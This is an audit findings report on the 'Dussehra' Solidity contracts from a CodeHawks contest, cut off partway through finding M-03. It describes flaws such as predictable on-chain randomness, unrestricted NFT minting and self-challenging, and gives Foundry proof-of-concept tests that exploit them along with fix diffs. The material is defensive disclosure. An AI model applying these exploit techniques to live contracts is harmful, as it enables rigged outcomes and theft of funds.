# First Flight #17: Dussehra - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Weak randomness in `ChoosingRam::increaseValuesOfParticipants` and `ChoosingRam::selectRamIfNotSelected`](#H-01)
    - ### [H-02. Gas war for becoming Ram, no incentive to join/mint later](#H-02)
    - ### [H-03. Anyone can mint NFTs for free due to missing access control in `RamNFT::mintRamNFT`](#H-03)
    - ### [H-04. `isRamSelected` is not updated when Ram is selected in `ChoosingRam::increaseValuesOfParticipants`](#H-04)
- ## Medium Risk Findings
    - ### [M-01. Users can "challenge" themselves in `ChoosingRam::increaseValuesOfParticipants`](#M-01)
    - ### [M-02. BNB Smart Chain's native currency is BNB, not ETH - `entranceFee` has to be adjusted at deployment](#M-02)
    - ### [M-03. Unupdated internal accounting when NFTs are transferred via `ERC721` functions](#M-03)
    - ### [M-04. Missing timegate for `Dussehra::enterPeopleWhoLikeRam`, users can join after Ram is selected/event ended](#M-04)
- ## Low Risk Findings
    - ### [L-01. ZkSync Era does not have native support for transferring Ether](#L-01)
    - ### [L-02. Possible reentrancy in `Dussehra::withdraw`](#L-02)
    - ### [L-03. Missing check of `tokenId` existance in `RamNFT::getCharacteristics`](#L-03)
    - ### [L-04. Incorrect timegates in `Dussehra::killRavana`](#L-04)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #17

### Dates: Jun 6th, 2024 - Jun 13th, 2024

[See more contest details here](https://www.codehawks.com/contests/clx1ufwjy006g3d8ddjdk3qfr)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 4
   - Medium: 4
   - Low: 4


# High Risk Findings

## <a id='H-01'></a>H-01. Weak randomness in `ChoosingRam::increaseValuesOfParticipants` and `ChoosingRam::selectRamIfNotSelected`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L90

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L51-L52

## Summary

`ChoosingRam::increaseValuesOfParticipants` and `ChoosingRam::selectRamIfNotSelected` are using on-chain values for randomness seed which results in weak randomness.

## Vulnerability Details

`ChoosingRam::increaseValuesOfParticipants` hashes `msg.sender`, `block.timestamp`, and `block.prevrandao` to create a supposedly random number to decide whether to improve the value of the challenger's NFT or that of the other player's NFT.

`ChoosingRam::selectRamIfNotSelected` hashes `block.timestamp` and `block.prevrandao` to create a supposedly random number to chose the Ram for the event. 

However, hashing these values does not create truly random numbers. Malicious users can manipulate these values or know them ahead of time:

- Validators can know ahead of time the `block.timestamp`.
- User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
- `prevrandao` [suffers from biasibility](https://soliditydeveloper.com/prevrandao), miners can know its value ahead of time. Furthermore, `prevrandao` is a constant in multiple target chains, which further diminished randomness:

-- [in Arbitrum, it is `1`](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/solidity-support)

-- [in zkSync, it is `2500000000000000`](https://docs.zksync.io/build/developer-reference/ethereum-differences/evm-instructions)

Blockchains are deterministic systems by nature, designed to achieve consensus across all nodes. Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

In the following test, `player1`
- precalculates the "random" number used to determine the winner of the challenge,
- challenges the other player only if he would win,
- keeps challenging the other player until his NFT reaches maximum value.

```javascript
    function testWeakRandomness(uint256 blockNumber) public {
        // Init block
        vm.assume(blockNumber < 1728777600 / 12);
        vm.roll(blockNumber);
        vm.warp(blockNumber * 12);

        // users enter to become players
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);

        vm.prank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        vm.prank(player2);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();

        // pre-checks
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.ownerOf(1), player2);

        // Prepare attack
        uint256 loop = 0;

        do {
            // Update block
            loop++;
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
            vm.prevrandao(keccak256(abi.encodePacked(block.number)));

            // Precalculate random
            uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, player1))) % 2;

            // If challenger is going to win, challenge someone until challenger's NFT reaches max value
            if (random == 0) {
                vm.prank(player1);
                choosingRam.increaseValuesOfParticipants(0, 1);
                if (ramNFT.getCharacteristics(0).isSatyavaakyah) {
                    break;
                }
            }
        } while (loop < 100);

        // Final checks
        // challenger's NFT is maxxed out
        assertEq(ramNFT.getCharacteristics(0).isSatyavaakyah, true);
        // challengee's NFT did not improve at all
        assertEq(ramNFT.getCharacteristics(1).isJitaKrodhah, false);
    }
```


## Impact
Malicious users can game the system and challenge others only if they are going to win.

## Tools Used
Manual review, Foundry.

## Recommendations
Consider using a cryptographically provable random number generator, such as 
- Chainlink VRF v2 or v2.5 for deployment on Ethereum, BNB, and Arbitrum,
- [Randomizer.AI](https://randomizer.substack.com/p/introducing-randomizerai-random-numbers-22-06-25) for ZkSync.
## <a id='H-02'></a>H-02. Gas war for becoming Ram, no incentive to join/mint later            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33-L81

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L52-L65

## Summary
The protocol design favors early paricipation: 
- the earlier one joins the event by calling `Dussehra::enterPeopleWhoLikeRam`, the earlier one can start challenging others (`ChoosingRam::increaseValuesOfParticipants`) in the hope of increasing the value of one's NFT;
- the earlier one starts to increase the value of one's NFT, the higher the chance one's NFT will be the first to reach the maximum possible value and as such, become the selected Ram for the event.

In contrast, there is no incentive to join the event in later stages.


## Impact
- Gas war for becoming the Ram for the event.
- Declining participation / no participation at all in later stages (after Ram has been selected).

## Tools Used
Manual review.

## Recommendations

There are multiple possible solutions you can consider:

- do not select Ram in `ChoosingRam::increaseValuesOfParticipants`. Instead, maintain a list all the NFTs that reached maximum value, and then randomly select Ram from that list (in ChoosingRam::selectRamIfNotSelected):

```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {RamNFT} from "./RamNFT.sol";

contract ChoosingRam {
    error ChoosingRam__InvalidTokenIdOfChallenger();
    error ChoosingRam__InvalidTokenIdOfPerticipent();
    error ChoosingRam__TimeToBeLikeRamFinish();
    error ChoosingRam__CallerIsNotChallenger();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();

    bool public isRamSelected;
    RamNFT public ramNFT;
    address public selectedRam;

+   uint256[] public maxValuedNFTs; // List of NFTs that reached maximum value


    modifier RamIsNotSelected() {
        require(!isRamSelected, "Ram is selected!");
        _;
    }

    modifier OnlyOrganiser() {
        require(ramNFT.organiser() == msg.sender, "Only organiser can call this function!");
        _;
    }

    constructor(address _ramNFT) {
        isRamSelected = false;
        ramNFT = RamNFT(_ramNFT);
    }

    function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }

        if (block.timestamp > 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamFinish();
        }
        
        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;

        if (random == 0) {
            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
-               selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
+               maxValuedNFTs.push(tokenId); // Add to max valued NFTs list

            }
        } else {
            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
-               selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
+               maxValuedNFTs.push(tokenId); // Add to max valued NFTs list

            }
        }
    }

    function selectRamIfNotSelected() public RamIsNotSelected OnlyOrganiser {
        if (block.timestamp < 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamIsNotFinish();
        }
        if (block.timestamp > 1728777600) {
            revert ChoosingRam__EventIsFinished();
        }
-       uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
+       uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % maxValuedNFTs.length;
-       selectedRam = ramNFT.getCharacteristics(random).ram;
+       selectedRam = ramNFT.getCharacteristics(maxValuedNFTs[random]).ram;
        isRamSelected = true;
    }
}
```

- implement a cool-off period for each tokenId in `ChoosingRam::increaseValuesOfParticipants` so that no single user can repeatedly call it at arbitrary frequency:
```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {RamNFT} from "./RamNFT.sol";

contract ChoosingRam {
    error ChoosingRam__InvalidTokenIdOfChallenger();
    error ChoosingRam__InvalidTokenIdOfPerticipent();
    error ChoosingRam__TimeToBeLikeRamFinish();
    error ChoosingRam__CallerIsNotChallenger();
    error ChoosingRam__TimeToBeLikeRamIsNotFinish();
    error ChoosingRam__EventIsFinished();
+   error ChoosingRam__CoolOffPeriodNotFinished(); 

    bool public isRamSelected;
    RamNFT public ramNFT;
    address public selectedRam;

+   uint256 public coolOffPeriod = 1 hours; // Cool-off period duration
+   mapping(uint256 => uint256) public lastChallengeTime; // Mapping to track last challenge time for each tokenId

    modifier RamIsNotSelected() {
        require(!isRamSelected, "Ram is selected!");
        _;
    }

    modifier OnlyOrganiser() {
        require(ramNFT.organiser() == msg.sender, "Only organiser can call this function!");
        _;
    }

    constructor(address _ramNFT) {
        isRamSelected = false;
        ramNFT = RamNFT(_ramNFT);
    }

    function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }

        if (block.timestamp > 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamFinish();
        }

+       if (block.timestamp < lastChallengeTime[tokenIdOfChallenger] + coolOffPeriod) {
+           revert ChoosingRam__CoolOffPeriodNotFinished();
+       }

+       lastChallengeTime[tokenIdOfChallenger] = block.timestamp;

        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;

        if (random == 0) {
            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false) {
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false) {
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false) {
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false) {
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false) {
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
            }
        } else {
            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false) {
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false) {
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false) {
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false) {
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false) {
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
            }
        }
    }

    function selectRamIfNotSelected() public RamIsNotSelected OnlyOrganiser {
        if (block.timestamp < 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamIsNotFinish();
        }
        if (block.timestamp > 1728777600) {
            revert ChoosingRam__EventIsFinished();
        }
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % ramNFT.tokenCounter();
        selectedRam = ramNFT.getCharacteristics(random).ram;
        isRamSelected = true;
    }
}

```
## <a id='H-03'></a>H-03. Anyone can mint NFTs for free due to missing access control in `RamNFT::mintRamNFT`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/RamNFT.sol#L49

## Summary
`RamNFT::mintRamNFT` lacks access control and allows anyone to mint any number of NFTs for free.

## Vulnerability Details
`RamNFT::mintRamNFT` is supposed to allow only the `Dussehra` contract to mint NFTs - this is to ensure that the protocol issues NFTs to only those users who call `Dussehra::enterPeopleWhoLikeRam` and pay the entrance fee for the event. 

However, `RamNFT::mintRamNFT` fails to implement to neccessary access control. Consequently, users can mint NFTs for free by directly calling `RamNFT::mintRamNFT`.

The following test demonstrates that`player1` can mint an NFT for free in such a way:

```javascript
    function test_canMintNftForFree() public {
        // player 1 calls RamNFT.mintRamNft directly to mint for free
        vm.prank(player1);
        ramNFT.mintRamNFT(player1);

        // player1 has the NFT
        assertEq(ramNFT.ownerOf(0), player1);
        assertEq(ramNFT.getCharacteristics(0).ram, player1);
    }
```

## Impact
Users can mint NFTs for free and can participate in the event as if they paid the entrance fee.

## Tools Used
Manual review, Foundry.

## Recommendations
Implement the proper access control as follows:

```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ERC721URIStorage, ERC721} from "@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol";

contract RamNFT is ERC721URIStorage {
    error RamNFT__NotOrganiser();
    error RamNFT__NotChoosingRamContract();
+ error RamNFT__NotDussehraContract();


    // https://medium.com/illumination/16-divine-qualities-of-lord-rama-24c326bd6048
    struct CharacteristicsOfRam {
        address ram;
        bool isJitaKrodhah;
        bool isDhyutimaan;
        bool isVidvaan;
        bool isAatmavan;
        bool isSatyavaakyah;
    }

    uint256 public tokenCounter;
    address public organiser;
    address public choosingRamContract;
+   address dussehraAddress;

    mapping(uint256 tokenId => CharacteristicsOfRam) public Characteristics;

    modifier onlyOrganiser() {
        if (msg.sender != organiser) {
            revert RamNFT__NotOrganiser();
        }
        _;
    }

    modifier onlyChoosingRamContract() {
        if (msg.sender != choosingRamContract) {
            revert RamNFT__NotChoosingRamContract();
        }
        _;
    }

    constructor() ERC721("RamNFT", "RAM") {
        tokenCounter = 0;
        organiser = msg.sender;
    }

+   function setDussehraAddress(address _dussehraAddress) public onlyOrganiser {
+        dussehraAddress = _dussehraAddress;
+   }

    function setChoosingRamContract(address _choosingRamContract) public onlyOrganiser {
        choosingRamContract = _choosingRamContract;
    }
    
    function mintRamNFT(address to) public {
+       if(msg.sender != dussehraAddress){
+           revert RamNFT__NotDussehraContract();
+       }
        uint256 newTokenId = tokenCounter++;
        _safeMint(to, newTokenId);

        Characteristics[newTokenId] = CharacteristicsOfRam({
            ram: to,
            isJitaKrodhah: false,
            isDhyutimaan: false,
            isVidvaan: false,
            isAatmavan: false,
            isSatyavaakyah: false
        });
    }

    ... 
}
```
## <a id='H-04'></a>H-04. `isRamSelected` is not updated when Ram is selected in `ChoosingRam::increaseValuesOfParticipants`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33-L81

## Summary
State variable `isRamSelected` is not updated when Ram is selected `ChoosingRam::increaseValuesOfParticipants`.

## Vulnerability Details
`ChoosingRam::increaseValuesOfParticipants` is supposed to select Ram for the event as soon as the value of an NFT reaches the maximum possible value (i.e. all boolean values in `RamNFT::CharacteristicsOfRam` is set to `true`). Even though this selection does happen, `isRamSelected` is not updated and not set to `true`.

This is demonstrated by the following test

```javascript
    function test_ramIsNotSelected() public {
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);

        vm.prank(player2);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();

        vm.startPrank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        choosingRam.increaseValuesOfParticipants(1, 0);
        choosingRam.increaseValuesOfParticipants(1, 0);
        choosingRam.increaseValuesOfParticipants(1, 0);
        choosingRam.increaseValuesOfParticipants(1, 0);
        choosingRam.increaseValuesOfParticipants(1, 0);
        vm.stopPrank();

        // NFT with tokenID = 0 reached maximum NFT value
        assertEq(ramNFT.getCharacteristics(0).isJitaKrodhah, true);
        assertEq(ramNFT.getCharacteristics(0).isAatmavan, true);
        assertEq(ramNFT.getCharacteristics(0).isDhyutimaan, true);
        assertEq(ramNFT.getCharacteristics(0).isSatyavaakyah, true);
        assertEq(ramNFT.getCharacteristics(0).isVidvaan, true);

        // isRamSelected has not been updated
        assertEq(choosingRam.isRamSelected(), false);
    }

```

## Impact
- initially selected Ram can be overwritten in `ChoosingRam::increaseValuesOfParticipants` if other NFT reaches the maximum possible value;
- initally selected Ram can be overwritten by `ChoosingRam::selectRamIfNotSelected`; 
- functions `Dussehra::killRavana` and `Dussehra::withdraw` will always revert due to them being gated by the `RamIsSelected` modifier - unless `organizer` overwrites the initally selected Ram by calling `ChoosingRam::selectRamIfNotSelected` which would set `isRamSelected = true;
`.

## Tools Used
Manual review, Foundry.

## Recommendations
Perform the following corrections in `ChoosingRam`:

```diff
    function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }

        if (block.timestamp > 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamFinish();
        }
        
        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;

        if (random == 0) {
            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
+          isRamSelected = true;
            }
        } else {
            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
+          isRamSelected = true;
            }
        }
    }
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Users can "challenge" themselves in `ChoosingRam::increaseValuesOfParticipants`            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/ChoosingRam.sol#L33-L81

## Summary
The current implementation of `ChoosingRam::increaseValuesOfParticipants` allows users to "challenge" themselves and essentially increase the value of their NFT with 100% certainty.

## Vulnerability Details
`ChoosingRam::increaseValuesOfParticipants` is supposed to allow one user with a Ram NFT to challenge another user with a Ram NFT - the stake of the challege is value increase for the winner. 

However, the current implementation of `ChoosingRam::increaseValuesOfParticipants` allows the two input parameters to be the same, i.e.  `tokenIdOfChallenger = tokenIdOfAnyPerticipent`. This essentially means that users can "challenge" themselves and increase the value of their own NFT with 100% certainty.

This is demonstrated in the following test:

```javascript
    function test_ChallengerChallengesHimself() public {
        vm.deal(player1, 1 ether);

        vm.startPrank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}(); // get NFT
        choosingRam.increaseValuesOfParticipants(0, 0); // challange himself

        vm.stopPrank();

        // value of the NFT increased
        assertEq(ramNFT.getCharacteristics(0).isJitaKrodhah, true);
    }
```

## Impact
A user can front-run others and become Ram for the event by challenging himself 5 times.

## Tools Used
Manual review, Foundry.

## Recommendations
Implement the following modifications in `ChoosingRam` to prevent users from "challenging" themselves:

```diff
  ...

+ error ChoosingRam__CannotChallengeYourself();

 ...

  function increaseValuesOfParticipants(uint256 tokenIdOfChallenger, uint256 tokenIdOfAnyPerticipent)
        public
        RamIsNotSelected
    {
+     if (tokenIdOfChallenger == tokenIdOfAnyPerticipent) {
+        revert ChoosingRam__CannotChallengeYourself();
+     }


        if (tokenIdOfChallenger > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfChallenger();
        }
        if (tokenIdOfAnyPerticipent > ramNFT.tokenCounter()) {
            revert ChoosingRam__InvalidTokenIdOfPerticipent();
        }
        if (ramNFT.getCharacteristics(tokenIdOfChallenger).ram != msg.sender) {
            revert ChoosingRam__CallerIsNotChallenger();
        }

        if (block.timestamp > 1728691200) {
            revert ChoosingRam__TimeToBeLikeRamFinish();
        }
        
        uint256 random =
            uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % 2;

        if (random == 0) {
            if (ramNFT.getCharacteristics(tokenIdOfChallenger).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfChallenger).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfChallenger, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfChallenger).ram;
            }
        } else {
            if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isJitaKrodhah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, false, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isDhyutimaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, false, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isVidvaan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, false, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isAatmavan == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, false);
            } else if (ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).isSatyavaakyah == false){
                ramNFT.updateCharacteristics(tokenIdOfAnyPerticipent, true, true, true, true, true);
                selectedRam = ramNFT.getCharacteristics(tokenIdOfAnyPerticipent).ram;
            }
        }
    }

    ...
```
## <a id='M-02'></a>M-02. BNB Smart Chain's native currency is BNB, not ETH - `entranceFee` has to be adjusted at deployment            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L77

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L86

https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/Dussehra.sol#L53

## Summary
The native currency of the BNB Smart Chain is BNB, not ETH as on the other deployment target chains Ethereum, Arbitrum and ZkSync.
This necessitates adjusting the `entranceFee` during deployment to ensure it aligns with the USD value intended for Ethereum deployments.

## Vulnerability Details
The `Dussehra` contract relies on transfers of the native currency at multiple points:

- in `Dussehra::enterPeopleWhoLikeRam`, which has to be called with `msg.value = entranceFee`,
- in `Dussehra::killRavana` when the low-level call `.call` is used,
- in `Dussehra::withdraw` when the low-level call `.call` is used.

Importantly, the native currency of BNB Smart Chain is BNB, not ETH as on the Ethereum, Arbitrum and ZkSync chains.

## Impact
If `Dussehra` is deployed with the same `entranceFee = X` on the BNB Smart Chain and on  Ethereum, the USD-denominated entrance fee will be wildly different on the 2 chains.

## Tools Used
Manual review.

## Recommendations
When deploying the protocol on the BNB Smart Chain, adjust the `entranceFee` so that the USD-denominated entrance fee will be similar to the USD-denominated entrance fee on Ethereum.
## <a id='M-03'></a>M-03. Unupdated internal accounting when NFTs are transferred via `ERC721` functions            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/9c86e1b09ed9516bfbb3851c145929806da75d87/src/RamNFT.sol#L12

## Summary
The `ram` field of the `RamNFT::CharacteristicsOfRam` struct is not updated when an NFT is transferred from one user to another using `ERC721` functions.

## Vulnerability Details
The `ram` field of the `RamNFT::CharacteristicsOfRam` struct is supposed to hold the address of the owner of the NFT. This field is first populated when an NFT is minted via `Dussehra::enterPeopleWhoLikeRam`, and is then used at several other places:
- in `ChoosingRam::increaseValuesOfParticipants`, to specify the selected Ram,
- in `ChoosingRam::selectRamIfNotSelected`, to specify the selected Ram,
- indirectly in `Dussehra::withdraw`, which is accessible only for the selected Ram.

However, the protocol does not take into account that users can sell/buy or transfer Ram NFTs between each other, and does not update the `CharacteristicsOfRam.ram` field when ownership changes.

This is demonstarted by the following test:

```javascript    
function test_NftTransferred() public {
        vm.deal(player1, 1 ether);

        vm.startPrank(player1);
        dussehra.enterPeopleWhoLikeRam{value: 1 ether}();
        ramNFT.safeTransferFrom(player1, player2, 0);
